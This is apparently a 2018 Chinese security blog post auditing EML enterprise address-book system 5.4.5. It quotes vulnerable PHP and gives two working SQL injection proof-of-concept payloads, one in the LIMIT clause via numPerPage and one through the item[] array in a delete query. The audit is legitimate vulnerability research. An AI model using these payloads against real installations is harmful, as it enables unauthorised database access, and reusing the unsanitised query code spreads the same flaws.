---
title: EML企业通讯录管理系统两处注入分析
date: 2018-8-12
tags: 代码审计
---

# 0x00 前言

最近一直在用onenote整理笔记，结果发现博客已经荒了很久了，就把审过的漏洞贴上来吧。虽然没有什么技术含量，但总归是一点记录。

# 0x01 漏洞环境

CMS：EML企业通讯录管理系统

版本：5.4.5

官方网站：http://bbs.emlsoft.com 

更新时间：2018.7.26 

测试环境：windows10+phpstudy+php5.5

# 0x02 漏洞分析

### 过滤函数：

对于小cms的sql注入的审计，一般存在两个方向：

1. 系统过滤机制的正面bypass;
2. 过滤的盲区(如：GPC之外的注入、limit/orderby之后的注入、二次入库的注入以及忘记过滤的地方等.);

当然，后者出现的概率更大并且也更好挖一点，先来看看过滤函数：

/lib/func.class.php:(27-37行)

```php
//安全验证
function _RunMagicQuotes(&$svar){
	if(!get_magic_quotes_gpc())	{
		if( is_array($svar) ){
			foreach($svar as $k => $v) $svar[$k] = _RunMagicQuotes($v);
		}else{
			$svar = addslashes($svar);
		}
	}
	return $svar;
}
```

未开启GPC则使用addslashes，也考虑到了数组的情况。感觉只要使用得当，就应该没有什么问题。

### 第一处注入：

action/action.address.php：（60-68行）

```php
 //设置分页
	if($_POST[numPerPage]==""){$numPerPage="10";}else{$numPerPage=$_POST[numPerPage];}
	if($_GET[pageNum]==""||$_GET[pageNum]=="0" ){$pageNum="0";}else{$pageNum=($_GET[pageNum]-1)*$numPerPage;}
	$num=mysql_query("select * from eml_address_list where 1=1 $search");//当前频道条数
	$total=mysql_num_rows($num);//总条数	
	$page=new page(array('total'=>$total,'perpage'=>$numPerPage));

 //查询
	$sql="select * from eml_address_list  where 1=1  $search order by id desc limit $pageNum,$numPerPage";
```

$pageNum $numPerPage 未进行过滤处理直接带入了查询语句，但是前者应该无法利用：`（$pageNum=($_GET[pageNum]-1)*$numPerPage;）`

后者位于limit中并且存在order by，([参考文章](http://www.freebuf.com/articles/web/57528.html))可使用如下利用方式。

POC：

`numPerPage=1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),0x7e);`

![](/images/sqli1.PNG)

### 第二处注入：

action/action.address.php：（186-206行)

```php
//批量删除
if($do=="del_all"){
	If_rabc($action,$do); //检测权限
	is_admin($action,$do); //检测权限
	$arr = $_POST["item"];
	$count_arr=count($arr); 
	if($count_arr==0){
	echo error($msg); 
	exit;
	}
	$str = implode("','",$arr);//拼接字符
	
	$sql = "delete from eml_address_list WHERE id in('{$str}')";
	
	if($db->query($sql)){echo success($msg,"?action=address");}else{echo error($msg);}
```

item参数通过POST方法传入，使用implode函数进行数组=>字符串，然后未经过滤直接进入delete语句执行，同样是忘记使用过滤函数的问题，不同点是必须传入数组才能利用，当然此处检测了is_admin，需要后台权限才能利用，比上一处利用条件更苛刻。

POC:

`item[]=2') or updatexml(1,concat(0x7e,(version())),0) -- dd`

![](/images/sqli2.PNG)

# 0x03 总结

感觉简单的太简单，难的又审不动，要走的路还很长呢。。。 